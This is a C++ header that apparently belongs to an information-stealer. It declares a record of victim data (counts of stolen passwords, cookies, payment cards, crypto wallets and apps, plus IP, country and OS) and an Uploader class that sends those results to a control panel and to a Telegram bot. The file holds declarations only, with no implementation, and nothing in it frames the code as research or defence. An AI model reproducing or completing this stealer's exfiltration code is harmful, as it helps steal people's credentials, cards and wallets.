#ifndef UPLOADER_H
#define UPLOADER_H

#include <string>

struct UserData {
    std::string country = "Unknown";
    std::string ip = "0.0.0.0";
    std::string tag = "default";
    int passwords = 0;
    int cookies = 0;
    int cards = 0;
    int wallets = 0;
    int apps = 0;
    std::string os_version = "Windows";
    double size = 0.0;
};

class Uploader {
public:
    static bool UploadToPanel(const UserData& data);
    static bool UploadToTelegram(const std::string& message);
    static bool UploadToPanelAndTelegram(const UserData& data, const std::string& message);
    
    static std::string GetPublicIP();
    static std::string DetectCountry(const std::string& ip);
    
private:
    static std::string PanelURL;
    static std::string TelegramToken;
    static std::string TelegramChatID;
};

#endif
